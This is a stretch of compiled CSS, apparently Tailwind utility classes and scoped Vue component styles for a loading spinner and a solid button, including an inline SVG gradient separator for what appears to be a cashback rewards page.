.border-\[\#7FD6E4\] {
  --tw-border-opacity: 1;
  border-color: rgb(127 214 228 / var(--tw-border-opacity, 1));
}
.border-dark-matter-60 {
  --tw-border-opacity: 1;
  border-color: rgb(97 59 106 / var(--tw-border-opacity, 1));
}
.border-error {
  --tw-border-opacity: 1;
  border-color: rgb(253 87 62 / var(--tw-border-opacity, 1));
}
.border-light-high {
  --tw-border-opacity: 1;
  border-color: rgb(182 179 199 / var(--tw-border-opacity, 1));
}
.border-light-low {
  --tw-border-opacity: 1;
  border-color: rgb(234 232 247 / var(--tw-border-opacity, 1));
}
.border-t-transparent {
  border-top-color: transparent;
}
.\!bg-action-primary {
  --tw-bg-opacity: 1 !important;
  background-color: rgb(98 66 252 / var(--tw-bg-opacity, 1)) !important;
}
.bg-action-primary {
  --tw-bg-opacity: 1;
  background-color: rgb(98 66 252 / var(--tw-bg-opacity, 1));
}
.bg-arcadia-50 {
  --tw-bg-opacity: 1;
  background-color: rgb(255 127 152 / var(--tw-bg-opacity, 1));
}
.bg-neutral-10 {
  --tw-bg-opacity: 1;
  background-color: rgb(234 232 247 / var(--tw-bg-opacity, 1));
}
.bg-neutral-50 {
  --tw-bg-opacity: 1;
  background-color: rgb(111 107 128 / var(--tw-bg-opacity, 1));
}
.bg-smoke {
  --tw-bg-opacity: 1;
  background-color: rgb(234 232 247 / var(--tw-bg-opacity, 1));
}
.bg-surface-dark {
  --tw-bg-opacity: 1;
  background-color: rgb(60 31 66 / var(--tw-bg-opacity, 1));
}
.bg-surface-selected {
  --tw-bg-opacity: 1;
  background-color: rgb(232 227 255 / var(--tw-bg-opacity, 1));
}
.bg-transparent {
  background-color: transparent;
}
.bg-white {
  --tw-bg-opacity: 1;
  background-color: rgb(255 255 255 / var(--tw-bg-opacity, 1));
}
.bg-\[url\(\'\~\/assets\/images\/cashback\/coda-rewards-lp-separator\.svg\'\)\] {
  background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='708' height='2' fill='none' viewBox='0 0 708 2'%3E%3Cpath stroke='url(%23a)' stroke-width='2' d='M0 1h708'/%3E%3Cdefs%3E%3ClinearGradient id='a' x1='0' x2='701.524' y1='2' y2='2' gradientUnits='userSpaceOnUse'%3E%3Cstop offset='.01' stop-color='%23613b6a' stop-opacity='.1'/%3E%3Cstop offset='.125' stop-color='%23613b6a'/%3E%3Cstop offset='.859' stop-color='%23f06383' stop-opacity='.5'/%3E%3Cstop offset='1' stop-color='%23f06383' stop-opacity='.1'/%3E%3C/linearGradient%3E%3C/defs%3E%3C/svg%3E");
}
.bg-center {
  background-position: 50%;
}
.bg-no-repeat {
  background-repeat: no-repeat;
}
.fill-dark-matter-100 {
  fill: #280031;
}
.p-4 {
  padding: 1rem;
}
.p-\[10px\] {
  padding: 10px;
}
.p-\[4px\] {
  padding: 4px;
}
.p-\[8px\] {
  padding: 8px;
}
.px-4 {
  padding-left: 1rem;
  padding-right: 1rem;
}
.px-\[10px\] {
  padding-left: 10px;
  padding-right: 10px;
}
.px-\[12px\] {
  padding-left: 12px;
  padding-right: 12px;
}
.px-\[16px\] {
  padding-left: 16px;
  padding-right: 16px;
}
.px-\[2px\] {
  padding-left: 2px;
  padding-right: 2px;
}
.px-\[30px\] {
  padding-left: 30px;
  padding-right: 30px;
}
.px-\[4px\] {
  padding-left: 4px;
  padding-right: 4px;
}
.px-\[8px\] {
  padding-left: 8px;
  padding-right: 8px;
}
.py-6 {
  padding-bottom: 1.5rem;
  padding-top: 1.5rem;
}
.py-\[10px\] {
  padding-bottom: 10px;
  padding-top: 10px;
}
.py-\[12px\] {
  padding-bottom: 12px;
  padding-top: 12px;
}
.py-\[16px\] {
  padding-bottom: 16px;
  padding-top: 16px;
}
.py-\[32px\] {
  padding-bottom: 32px;
  padding-top: 32px;
}
.py-\[4px\] {
  padding-bottom: 4px;
  padding-top: 4px;
}
.py-\[8px\] {
  padding-bottom: 8px;
  padding-top: 8px;
}
.pb-6 {
  padding-bottom: 1.5rem;
}
.pr-\[5px\] {
  padding-right: 5px;
}
.ps-5 {
  padding-inline-start: 1.25rem;
}
.ps-\[40px\] {
  padding-inline-start: 40px;
}
.pt-\[18px\] {
  padding-top: 18px;
}
.text-center {
  text-align: center;
}
.align-bottom {
  vertical-align: bottom;
}
.text-2xl {
  font-size: 1.5rem;
  line-height: 2rem;
}
.text-\[10px\] {
  font-size: 10px;
}
.text-\[14px\] {
  font-size: 14px;
}
.text-\[24px\] {
  font-size: 24px;
}
.text-base {
  font-size: 1rem;
  line-height: 1.5rem;
}
.text-lg {
  font-size: 1.125rem;
  line-height: 1.75rem;
}
.text-sm {
  font-size: 0.875rem;
  line-height: 1.25rem;
}
.text-xs {
  font-size: 0.75rem;
  line-height: 1rem;
}
.font-bold {
  font-weight: 700;
}
.font-light {
  font-weight: 300;
}
.font-normal {
  font-weight: 400;
}
.font-semibold {
  font-weight: 600;
}
.italic {
  font-style: italic;
}
.leading-6 {
  line-height: 1.5rem;
}
.text-\[\#333\] {
  --tw-text-opacity: 1;
  color: rgb(51 51 51 / var(--tw-text-opacity, 1));
}
.text-action-primary {
  --tw-text-opacity: 1;
  color: rgb(98 66 252 / var(--tw-text-opacity, 1));
}
.text-arcadia-50 {
  --tw-text-opacity: 1;
  color: rgb(255 127 152 / var(--tw-text-opacity, 1));
}
.text-black {
  --tw-text-opacity: 1;
  color: rgb(0 0 0 / var(--tw-text-opacity, 1));
}
.text-dark {
  --tw-text-opacity: 1;
  color: rgb(63 60 77 / var(--tw-text-opacity, 1));
}
.text-dark-disabled {
  --tw-text-opacity: 1;
  color: rgb(182 179 199 / var(--tw-text-opacity, 1));
}
.text-dark-matter-100 {
  --tw-text-opacity: 1;
  color: rgb(40 0 49 / var(--tw-text-opacity, 1));
}
.text-dark-matter-60 {
  --tw-text-opacity: 1;
  color: rgb(97 59 106 / var(--tw-text-opacity, 1));
}
.text-dark-subdued {
  --tw-text-opacity: 1;
  color: rgb(145 141 161 / var(--tw-text-opacity, 1));
}
.text-expressive-burst {
  --tw-text-opacity: 1;
  color: rgb(232 249 83 / var(--tw-text-opacity, 1));
}
.text-gray-400 {
  --tw-text-opacity: 1;
  color: rgb(156 163 175 / var(--tw-text-opacity, 1));
}
.text-icon-dark {
  --tw-text-opacity: 1;
  color: rgb(63 60 77 / var(--tw-text-opacity, 1));
}
.text-icon-interactive {
  --tw-text-opacity: 1;
  color: rgb(98 66 252 / var(--tw-text-opacity, 1));
}
.text-light {
  --tw-text-opacity: 1;
  color: rgb(246 245 252 / var(--tw-text-opacity, 1));
}
.text-light-subdued {
  --tw-text-opacity: 1;
  color: rgb(182 179 199 / var(--tw-text-opacity, 1));
}
.text-neutral-10 {
  --tw-text-opacity: 1;
  color: rgb(234 232 247 / var(--tw-text-opacity, 1));
}
.text-neutral-30 {
  --tw-text-opacity: 1;
  color: rgb(182 179 199 / var(--tw-text-opacity, 1));
}
.text-neutral-70 {
  --tw-text-opacity: 1;
  color: rgb(63 60 77 / var(--tw-text-opacity, 1));
}
.text-portal-70 {
  --tw-text-opacity: 1;
  color: rgb(82 43 227 / var(--tw-text-opacity, 1));
}
.text-red-500 {
  --tw-text-opacity: 1;
  color: rgb(239 68 68 / var(--tw-text-opacity, 1));
}
.text-white {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
}
.opacity-0 {
  opacity: 0;
}
.opacity-100 {
  opacity: 1;
}
.shadow-md {
  --tw-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),
    0 2px 4px -2px rgba(0, 0, 0, 0.1);
  --tw-shadow-colored: 0 4px 6px -1px var(--tw-shadow-color),
    0 2px 4px -2px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
    var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}
.blur {
  --tw-blur: blur(8px);
}
.blur,
.filter {
  filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast)
    var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate)
    var(--tw-sepia) var(--tw-drop-shadow);
}
.transition {
  transition-duration: 0.15s;
  transition-property: color, background-color, border-color,
    text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter,
    backdrop-filter;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}
.transition-opacity {
  transition-duration: 0.15s;
  transition-property: opacity;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}
.duration-200 {
  transition-duration: 0.2s;
}
.duration-300,
.duration-\[300ms\] {
  transition-duration: 0.3s;
}
.duration-\[400ms\] {
  transition-duration: 0.4s;
}
.ease-in {
  transition-timing-function: cubic-bezier(0.4, 0, 1, 1);
}
.ease-in-out {
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}
.ease-linear {
  transition-timing-function: linear;
}
.ease-out {
  transition-timing-function: cubic-bezier(0, 0, 0.2, 1);
}
.page-cjk {
  word-break: keep-all;
}
.only\:mx-auto:only-child {
  margin-left: auto;
  margin-right: auto;
}
.checked\:text-action-primary:checked {
  --tw-text-opacity: 1;
  color: rgb(98 66 252 / var(--tw-text-opacity, 1));
}
.hover\:cursor-pointer:hover {
  cursor: pointer;
}
.hover\:cursor-wait:hover {
  cursor: wait;
}
.hover\:rounded-full:hover {
  border-radius: 100px;
}
.hover\:bg-action-primary:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(98 66 252 / var(--tw-bg-opacity, 1));
}
.hover\:bg-neutral-30:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(182 179 199 / var(--tw-bg-opacity, 1));
}
.hover\:bg-smoke:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(234 232 247 / var(--tw-bg-opacity, 1));
}
.hover\:bg-surface-dark-lighter:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(97 59 106 / var(--tw-bg-opacity, 1));
}
.hover\:bg-surface-selected:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(232 227 255 / var(--tw-bg-opacity, 1));
}
.hover\:text-white:hover {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
}
.hover\:underline:hover {
  text-decoration-line: underline;
}
.hover\:checked\:text-action-primary-hover:checked:hover {
  --tw-text-opacity: 1;
  color: rgb(68 23 201 / var(--tw-text-opacity, 1));
}
.focus\:pt-\[18px\]:focus {
  padding-top: 18px;
}
.focus\:outline-portal-40:focus {
  outline-color: #9c88ff;
}
.focus\:ring-0:focus {
  --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
    var(--tw-ring-offset-width) var(--tw-ring-offset-color);
  --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width))
    var(--tw-ring-color);
  box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
    var(--tw-shadow, 0 0 #0000);
}
.focus\:checked\:text-portal-70:checked:focus {
  --tw-text-opacity: 1;
  color: rgb(82 43 227 / var(--tw-text-opacity, 1));
}
.active\:rounded-full:active {
  border-radius: 100px;
}
.active\:border-action-primary-pressed:active {
  --tw-border-opacity: 1;
  border-color: rgb(50 0 150 / var(--tw-border-opacity, 1));
}
.active\:bg-neutral-70:active {
  --tw-bg-opacity: 1;
  background-color: rgb(63 60 77 / var(--tw-bg-opacity, 1));
}
.active\:bg-surface-dark-lighter:active {
  --tw-bg-opacity: 1;
  background-color: rgb(97 59 106 / var(--tw-bg-opacity, 1));
}
.active\:text-action-primary-hover:active {
  --tw-text-opacity: 1;
  color: rgb(68 23 201 / var(--tw-text-opacity, 1));
}
.disabled\:cursor-not-allowed:disabled {
  cursor: not-allowed;
}
.disabled\:border-light-high:disabled {
  --tw-border-opacity: 1;
  border-color: rgb(182 179 199 / var(--tw-border-opacity, 1));
}
.disabled\:\!bg-neutral-30:disabled {
  --tw-bg-opacity: 1 !important;
  background-color: rgb(182 179 199 / var(--tw-bg-opacity, 1)) !important;
}
.disabled\:bg-action-primary-disabled:disabled {
  --tw-bg-opacity: 1;
  background-color: rgb(234 232 247 / var(--tw-bg-opacity, 1));
}
.disabled\:text-action-primary-disabled:disabled {
  --tw-text-opacity: 1;
  color: rgb(234 232 247 / var(--tw-text-opacity, 1));
}
.disabled\:\!opacity-50:disabled {
  opacity: 0.5 !important;
}
.peer:focus ~ .peer-focus\:\!visible {
  visibility: visible !important;
}
.peer:focus ~ .peer-focus\:visible {
  visibility: visible;
}
.ui-checked\:flex-row-reverse[data-headlessui-state~="checked"] {
  flex-direction: row-reverse;
}
.ui-checked\:bg-action-primary[data-headlessui-state~="checked"] {
  --tw-bg-opacity: 1;
  background-color: rgb(98 66 252 / var(--tw-bg-opacity, 1));
}
.ui-checked\:hover\:bg-action-primary-hover:hover[data-headlessui-state~="checked"] {
  --tw-bg-opacity: 1;
  background-color: rgb(68 23 201 / var(--tw-bg-opacity, 1));
}
.ui-checked\:active\:bg-action-primary-pressed:active[data-headlessui-state~="checked"] {
  --tw-bg-opacity: 1;
  background-color: rgb(50 0 150 / var(--tw-bg-opacity, 1));
}
:where([data-headlessui-state~="checked"]) .ui-checked\:flex-row-reverse {
  flex-direction: row-reverse;
}
:where([data-headlessui-state~="checked"]) .ui-checked\:bg-action-primary {
  --tw-bg-opacity: 1;
  background-color: rgb(98 66 252 / var(--tw-bg-opacity, 1));
}
:where([data-headlessui-state~="checked"])
  .ui-checked\:hover\:bg-action-primary-hover:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(68 23 201 / var(--tw-bg-opacity, 1));
}
:where([data-headlessui-state~="checked"])
  .ui-checked\:active\:bg-action-primary-pressed:active {
  --tw-bg-opacity: 1;
  background-color: rgb(50 0 150 / var(--tw-bg-opacity, 1));
}
.ui-selected\:text-dark-heading[data-headlessui-state~="selected"] {
  --tw-text-opacity: 1;
  color: rgb(47 18 54 / var(--tw-text-opacity, 1));
}
:where([data-headlessui-state~="selected"]) .ui-selected\:text-dark-heading {
  --tw-text-opacity: 1;
  color: rgb(47 18 54 / var(--tw-text-opacity, 1));
}
.hover\:ui-disabled\:cursor-not-allowed[data-headlessui-state~="disabled"]:hover {
  cursor: not-allowed;
}
:where([data-headlessui-state~="disabled"])
  .hover\:ui-disabled\:cursor-not-allowed:hover {
  cursor: not-allowed;
}
.current\:bg-portal-10[data-variant="current"],
[data-variant="current"] .current\:bg-portal-10 {
  --tw-bg-opacity: 1;
  background-color: rgb(232 227 255 / var(--tw-bg-opacity, 1));
}
.pending\:bg-orange-20[data-variant="pending"],
[data-variant="pending"] .pending\:bg-orange-20 {
  --tw-bg-opacity: 1;
  background-color: rgb(255 230 187 / var(--tw-bg-opacity, 1));
}
.default\:bg-neutral-10[data-variant="default"],
[data-variant="default"] .default\:bg-neutral-10 {
  --tw-bg-opacity: 1;
  background-color: rgb(234 232 247 / var(--tw-bg-opacity, 1));
}
.error\:bg-red-10[data-variant="error"] {
  --tw-bg-opacity: 1;
  background-color: rgb(255 214 207 / var(--tw-bg-opacity, 1));
}
.error\:text-red-60[data-variant="error"] {
  --tw-text-opacity: 1;
  color: rgb(196 36 0 / var(--tw-text-opacity, 1));
}
[data-variant="error"] .error\:bg-red-10 {
  --tw-bg-opacity: 1;
  background-color: rgb(255 214 207 / var(--tw-bg-opacity, 1));
}
[data-variant="error"] .error\:text-red-60 {
  --tw-text-opacity: 1;
  color: rgb(196 36 0 / var(--tw-text-opacity, 1));
}
.success\:bg-green-5[data-variant="success"] {
  --tw-bg-opacity: 1;
  background-color: rgb(213 247 219 / var(--tw-bg-opacity, 1));
}
.success\:text-green-60[data-variant="success"] {
  --tw-text-opacity: 1;
  color: rgb(19 154 78 / var(--tw-text-opacity, 1));
}
[data-variant="success"] .success\:bg-green-5 {
  --tw-bg-opacity: 1;
  background-color: rgb(213 247 219 / var(--tw-bg-opacity, 1));
}
[data-variant="success"] .success\:text-green-60 {
  --tw-text-opacity: 1;
  color: rgb(19 154 78 / var(--tw-text-opacity, 1));
}
.large\:h-\[20px\][data-size="large"] {
  height: 20px;
}
.large\:w-\[40px\][data-size="large"] {
  width: 40px;
}
[data-size="large"] .large\:h-\[20px\] {
  height: 20px;
}
[data-size="large"] .large\:w-\[40px\] {
  width: 40px;
}
.lightTheme\:text-dark[data-theme="lightTheme"] {
  --tw-text-opacity: 1;
  color: rgb(63 60 77 / var(--tw-text-opacity, 1));
}
.lightTheme\:text-dark-disabled[data-theme="lightTheme"],
.peer:disabled
  ~ .lightTheme\:peer-disabled\:text-dark-disabled[data-theme="lightTheme"] {
  --tw-text-opacity: 1;
  color: rgb(182 179 199 / var(--tw-text-opacity, 1));
}
[data-theme="lightTheme"] .lightTheme\:text-dark {
  --tw-text-opacity: 1;
  color: rgb(63 60 77 / var(--tw-text-opacity, 1));
}
[data-theme="lightTheme"] .lightTheme\:text-dark-disabled,
[data-theme="lightTheme"]
  .peer:disabled
  ~ .lightTheme\:peer-disabled\:text-dark-disabled {
  --tw-text-opacity: 1;
  color: rgb(182 179 199 / var(--tw-text-opacity, 1));
}
.darkTheme\:text-light[data-theme="darkTheme"] {
  --tw-text-opacity: 1;
  color: rgb(246 245 252 / var(--tw-text-opacity, 1));
}
.peer:disabled
  ~ .darkTheme\:peer-disabled\:text-light-disabled[data-theme="darkTheme"] {
  --tw-text-opacity: 1;
  color: rgb(145 141 161 / var(--tw-text-opacity, 1));
}
[data-theme="darkTheme"] .darkTheme\:text-light {
  --tw-text-opacity: 1;
  color: rgb(246 245 252 / var(--tw-text-opacity, 1));
}
[data-theme="darkTheme"]
  .peer:disabled
  ~ .darkTheme\:peer-disabled\:text-light-disabled {
  --tw-text-opacity: 1;
  color: rgb(145 141 161 / var(--tw-text-opacity, 1));
}
@media (min-width: 768px) {
  .md\:mt-\[unset\] {
    margin-top: unset;
  }
  .md\:block {
    display: block;
  }
  .md\:max-h-\[286px\] {
    max-height: 286px;
  }
  .md\:w-2\/5 {
    width: 40%;
  }
  .md\:w-auto {
    width: auto;
  }
  .md\:min-w-\[350px\] {
    min-width: 350px;
  }
  .md\:max-w-\[700px\] {
    max-width: 700px;
  }
  .md\:max-w-full {
    max-width: 100%;
  }
  .md\:max-w-lg {
    max-width: 32rem;
  }
  .md\:basis-\[unset\] {
    flex-basis: unset;
  }
  .md\:flex-nowrap {
    flex-wrap: nowrap;
  }
  .md\:text-right {
    text-align: right;
  }
  .md\:duration-0 {
    transition-duration: 0s;
  }
}
@media (min-width: 992px) {
  .lg\:block {
    display: block;
  }
  .lg\:hidden {
    display: none;
  }
  .lg\:w-\[350px\] {
    width: 350px;
  }
  .lg\:max-w-\[700px\] {
    max-width: 700px;
  }
  .lg\:px-0 {
    padding-left: 0;
    padding-right: 0;
  }
  .lg\:py-\[50px\] {
    padding-bottom: 50px;
    padding-top: 50px;
  }
}
@media (min-width: 1200px) {
  .xl\:max-w-\[800px\] {
    max-width: 800px;
  }
}
.ltr\:ml-auto:where([dir="ltr"], [dir="ltr"] *) {
  margin-left: auto;
}
.rtl\:mr-auto:where([dir="rtl"], [dir="rtl"] *) {
  margin-right: auto;
}
</style>
      <style>@keyframes spin-a7a8fb45{to{transform:rotate(1turn)}}.loading-spinner[data-v-a7a8fb45]{animation:spin-a7a8fb45 1s linear infinite;stroke:currentColor}.loading-spinner g[data-v-a7a8fb45]{transform-origin:center}@keyframes rotate-a7a8fb45{to{transform:rotate(1turn)}}.loading-spinner g[data-v-a7a8fb45]{animation:rotate-a7a8fb45 2s linear infinite}@keyframes circle-a7a8fb45{0%{stroke-dasharray:0 150;stroke-dashoffset:0}47.5%{stroke-dasharray:42 150;stroke-dashoffset:-16}95%,to{stroke-dasharray:42 150;stroke-dashoffset:-59}}.loading-spinner g circle[data-v-a7a8fb45]{animation:circle-a7a8fb45 1.5s ease-in-out infinite}</style>
      <style>.button-solid[data-v-cac760de]{border-radius:100px;border-style:solid;border-width:1px;font-size:14px;font-weight:600;height:44px;line-height:150%;overflow-wrap:break-word;position:relative;--tw-border-opacity:1;border-color:rgb(156 136 255/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(98 66 252/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(246 245 252/var(--tw-text-opacity,1))}.button-solid[data-size=large][data-v-cac760de],[data-size=large] .button-solid[data-v-cac760de]{font-size:16px;line-height:150%}.button-solid[data-v-cac760de]:hover{--tw-bg-opacity:1;background-color:rgb(68 23 201/var(--tw-bg-opacity,1))}.button-solid[data-v-cac760de]:focus{--tw-border-opacity:1;border-color:rgb(255 255 255/var(--tw-border-opacity,1));--tw-shadow:0 0 0 2px;--tw-shadow-colored:0 0 0 2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow);--tw-shadow-color:#9c88ff;--tw-shadow:var(--tw-shadow-colored)}.button-solid[data-v-cac760de]:active{--tw-bg-opacity:1;background-color:rgb(50 0 150/var(--tw-bg-opacity,1))}.button-solid[data-v-cac760de]:hover:disabled{cursor:not-allowed}.button-solid[data-variant=secondary][data-v-cac760de]{--tw-border-opacity:1;border-color:rgb(217 209 255/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(246 245 252/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1))}.button-solid:hover[data-variant=secondary][data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1))}.button-solid:active[data-variant=secondary][data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(209 207 227/var(--tw-bg-opacity,1))}[data-variant=secondary] .button-solid[data-v-cac760de]{--tw-border-opacity:1;border-color:rgb(217 209 255/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(246 245 252/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1))}[data-variant=secondary] .button-solid[data-v-cac760de]:hover{--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1))}[data-variant=secondary] .button-solid[data-v-cac760de]:active{--tw-bg-opacity:1;background-color:rgb(209 207 227/var(--tw-bg-opacity,1))}.button-solid[data-variant=alternate][data-v-cac760de]{--tw-border-opacity:1;border-color:rgb(247 255 160/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(232 249 83/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}.button-solid:hover[data-variant=alternate][data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(211 228 59/var(--tw-bg-opacity,1))}.button-solid:active[data-variant=alternate][data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(190 208 38/var(--tw-bg-opacity,1))}[data-variant=alternate] .button-solid[data-v-cac760de]{--tw-border-opacity:1;border-color:rgb(247 255 160/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(232 249 83/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}[data-variant=alternate] .button-solid[data-v-cac760de]:hover{--tw-bg-opacity:1;background-color:rgb(211 228 59/var(--tw-bg-opacity,1))}[data-variant=alternate] .button-solid[data-v-cac760de]:active{--tw-bg-opacity:1;background-color:rgb(190 208 38/var(--tw-bg-opacity,1))}.button-solid[data-variant=destructive][data-v-cac760de]{--tw-border-opacity:1;border-color:rgb(253 87 62/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(196 36 0/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(246 245 252/var(--tw-text-opacity,1))}.button-solid:hover[data-variant=destructive][data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(167 35 0/var(--tw-bg-opacity,1))}.button-solid:active[data-variant=destructive][data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(139 32 0/var(--tw-bg-opacity,1))}[data-variant=destructive] .button-solid[data-v-cac760de]{--tw-border-opacity:1;border-color:rgb(253 87 62/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(196 36 0/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(246 245 252/var(--tw-text-opacity,1))}[data-variant=destructive] .button-solid[data-v-cac760de]:hover{--tw-bg-opacity:1;background-color:rgb(167 35 0/var(--tw-bg-opacity,1))}[data-variant=destructive] .button-solid[data-v-cac760de]:active{--tw-bg-opacity:1;background-color:rgb(139 32 0/var(--tw-bg-opacity,1))}.button-solid[data-variant=destructive-subdue][data-v-cac760de]{--tw-border-opacity:1;border-color:rgb(217 209 255/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(246 245 252/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(196 36 0/var(--tw-text-opacity,1))}.button-solid:hover[data-variant=destructive-subdue][data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1))}.button-solid:active[data-variant=destructive-subdue][data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(209 207 227/var(--tw-bg-opacity,1))}[data-variant=destructive-subdue] .button-solid[data-v-cac760de]{--tw-border-opacity:1;border-color:rgb(217 209 255/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(246 245 252/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(196 36 0/var(--tw-text-opacity,1))}[data-variant=destructive-subdue] .button-solid[data-v-cac760de]:hover{--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1))}[data-variant=destructive-subdue] .button-solid[data-v-cac760de]:active{--tw-bg-opacity:1;background-color:rgb(209 207 227/var(--tw-bg-opacity,1))}.button-solid[data-variant=success][data-v-cac760de]{--tw-border-opacity:1;border-color:rgb(6 135 73/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(6 135 73/var(--tw-bg-opacity,1))}.button-solid:hover[data-variant=success][data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(0 117 71/var(--tw-bg-opacity,1))}.button-solid:active[data-variant=success][data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(0 79 62/var(--tw-bg-opacity,1))}[data-variant=success] .button-solid[data-v-cac760de]{--tw-border-opacity:1;border-color:rgb(6 135 73/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(6 135 73/var(--tw-bg-opacity,1))}[data-variant=success] .button-solid[data-v-cac760de]:hover{--tw-bg-opacity:1;background-color:rgb(0 117 71/var(--tw-bg-opacity,1))}[data-variant=success] .button-solid[data-v-cac760de]:active{--tw-bg-opacity:1;background-color:rgb(0 79 62/var(--tw-bg-opacity,1))}.button-solid[data-size=small][data-v-cac760de],[data-size=small] .button-solid[data-v-cac760de]{border-width:.5px;height:32px}.button-solid[data-size=large][data-v-cac760de],[data-size=large] .button-solid[data-v-cac760de]{height:48px}.button-solid[data-loading=true][data-v-cac760de]{border-style:none}.button-solid:hover[data-loading=true][data-v-cac760de],.button-solid[data-loading=true][data-v-cac760de],[data-loading=true] .button-solid[data-v-cac760de]{--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1))}[data-loading=true] .button-solid[data-v-cac760de]{border-style:none}[data-loading=true] .button-solid[data-v-cac760de]:hover{--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1))}.button-solid .button-solid__inner[data-v-cac760de]{display:flex;justify-content:center;position:relative}.button-solid .button-solid__inner .button-solid__inner__content[data-v-cac760de]{display:flex}.button-solid .button-solid__inner .button-solid__inner__content .button-solid__inner__content__icon[data-v-cac760de]{height:20px;margin-left:4px;margin-right:4px;width:20px}.button-solid .button-solid__inner .button-solid__inner__content .button-solid__inner__content__icon[data-size=large][data-v-cac760de],[data-size=large] .button-solid .button-solid__inner .button-solid__inner__content .button-solid__inner__content__icon[data-v-cac760de]{height:24px;width:24px}.button-solid .button-solid__inner .button-solid__inner__content .button-solid__inner__content__slot[data-v-cac760de]{margin-left:4px;margin-right:4px}.button-solid .button-solid__inner .button-solid__inner__content--icon-prefix[data-v-cac760de]{flex-direction:row}.button-solid .button-solid__inner .button-solid__inner__content--icon-suffix[data-v-cac760de]{flex-direction:row-reverse}.button-solid .button-solid__inner .button-solid__inner__spinner[data-v-cac760de]{display:none;height:100%;position:absolute;width:100%;--tw-text-opacity:1;color:rgb(82 43 227/var(--tw-text-opacity,1))}.button-solid[data-loading=true] .button-solid__inner__content[data-v-cac760de]{visibility:hidden}.button-solid[data-loading=true] .button-solid__inner__spinner[data-v-cac760de]{display:block}button.button-solid[data-v-cac760de]:disabled,button.button-solid[data-v-cac760de]:disabled:hover{border-style:none;--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(182 179 199/var(--tw-text-opacity,1))}.button-solid--with-content[data-v-cac760de]{min-width:60px;padding-left:16px;padding-right:16px}.button-solid--with-content[data-size=small][data-v-cac760de],[data-size=small] .button-solid--with-content[data-v-cac760de]{padding-left:12px;padding-right:12px}.button-solid--with-content[data-size=large][data-v-cac760de],[data-size=large] .button-solid--with-content[data-v-cac760de]{padding-left:20px;padding-right:20px}.button-solid--without-content[data-v-cac760de]{padding-left:8px;padding-right:8px}.button-solid--without-content[data-size=small][data-v-cac760de],[data-size=small] .button-solid--without-content[data-v-cac760de]{padding-left:2px;padding-right:2px}.button-solid--without-content[data-size=large][data-v-cac760de],[data-size=large] .button-solid--without-content[data-v-cac760de]{padding-left:10px;padding-right:10px}.button-solid--full-width[data-v-cac760de]{width:100%}</style>
